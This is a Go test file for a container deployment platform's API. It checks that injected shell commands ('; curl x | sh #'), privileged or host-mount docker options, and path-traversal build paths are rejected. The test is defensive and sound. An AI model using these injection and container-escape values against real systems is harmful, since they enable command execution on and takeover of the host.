package api

import (
	"fmt"
	"net/http"
	"testing"
)

// Extra docker run options and database arguments cannot reach the shell or
// hand a container the host.
func TestDockerOptionsPolicy(t *testing.T) {
	e := newTestEnv(t)
	e.user("owner@corp.com", "correct-horse", "owner")
	e.user("dev@corp.com", "correct-horse", "member")
	if _, err := e.db.Exec("INSERT INTO servers(id, name, host, status) VALUES (1, 'local', 'localhost', 'reachable')"); err != nil {
		t.Fatal(err)
	}
	owner := e.login("owner@corp.com")
	dev := e.login("dev@corp.com")
	p := e.expect(dev, "POST", "/api/projects", map[string]any{"name": "shop"}, 200)
	env := p["environments"].([]any)[0].(map[string]any)["id"]
	post := func(c *http.Client, opts string, code int) map[string]any {
		return e.expect(c, "POST", "/api/applications", map[string]any{
			"name": "web-" + fmt.Sprint(len(opts)), "environment_id": env, "server_id": 1, "source_type": "image", "docker_image": "nginx",
			"custom_docker_options": opts,
		}, code)
	}
	for _, bad := range []string{"; curl x | sh #", "--privileged", "--pid host", "-v /:/host", "-v /var/run/docker.sock:/var/run/docker.sock", "--cap-add SYS_ADMIN", "--label traefik.enable=true"} {
		post(dev, bad, 400)
	}
	post(owner, "--privileged", 400)
	post(owner, "-v /var/run/docker.sock:/s", 400)
	app := post(dev, "-v sy-web-data:/data --shm-size 1g", 200)
	base := fmt.Sprintf("/api/applications/%v", app["id"])

	// An administrator may bind-mount a server path; the member can still edit
	// other fields afterwards, but cannot add host mounts themselves.
	app["custom_docker_options"] = "-v /srv/media:/media:ro"
	e.expect(dev, "PATCH", base, app, 400)
	e.expect(owner, "PATCH", base, app, 200)
	app["description"] = "edited by the developer"
	e.expect(dev, "PATCH", base, app, 200)
	app["custom_docker_options"] = "-v /srv/media:/media:ro -v /etc:/etc"
	e.expect(dev, "PATCH", base, app, 400)
	e.expect(owner, "PATCH", base, app, 400)

	// Database arguments must parse; they are quoted later, so no policy is needed.
	e.expect(dev, "POST", "/api/databases", map[string]any{"name": "orders", "engine": "postgres", "environment_id": env, "server_id": 1, "start": false, "custom_args": `-c "max_connections=200`}, 400)
	e.expect(dev, "POST", "/api/databases", map[string]any{"name": "orders", "engine": "postgres", "environment_id": env, "server_id": 1, "start": false, "custom_args": `-c max_connections=200`}, 200)
}

// Paths inside the checkout cannot climb out of the repository.
func TestBuildPathsStayInRepository(t *testing.T) {
	e := newTestEnv(t)
	e.user("owner@corp.com", "correct-horse", "owner")
	if _, err := e.db.Exec("INSERT INTO servers(id, name, host, status) VALUES (1, 'local', 'localhost', 'reachable')"); err != nil {
		t.Fatal(err)
	}
	c := e.login("owner@corp.com")
	p := e.expect(c, "POST", "/api/projects", map[string]any{"name": "shop"}, 200)
	env := p["environments"].([]any)[0].(map[string]any)["id"]
	body := func(extra map[string]any) map[string]any {
		m := map[string]any{"name": "web", "environment_id": env, "server_id": 1, "source_type": "git", "git_repository": "https://example.com/r.git", "build_pack": "dockerfile"}
		for k, v := range extra {
			m[k] = v
		}
		return m
	}
	for _, bad := range []map[string]any{
		{"base_directory": "../../"}, {"base_directory": "apps/../../.."}, {"dockerfile_path": "../../../secret.key"},
		{"compose_path": "../portdock.db"}, {"publish_directory": "../"},
	} {
		e.expect(c, "POST", "/api/applications", body(bad), 400)
	}
	app := e.expect(c, "POST", "/api/applications", body(map[string]any{"base_directory": "/apps/web/", "dockerfile_path": "./docker/Dockerfile", "compose_path": "", "publish_directory": "/"}), 200)
	if app["base_directory"] != "apps/web" || app["dockerfile_path"] != "docker/Dockerfile" || app["compose_path"] != "docker-compose.yml" || app["publish_directory"] != "" {
		t.Fatalf("normalized paths: %v %v %v %v", app["base_directory"], app["dockerfile_path"], app["compose_path"], app["publish_directory"])
	}
}
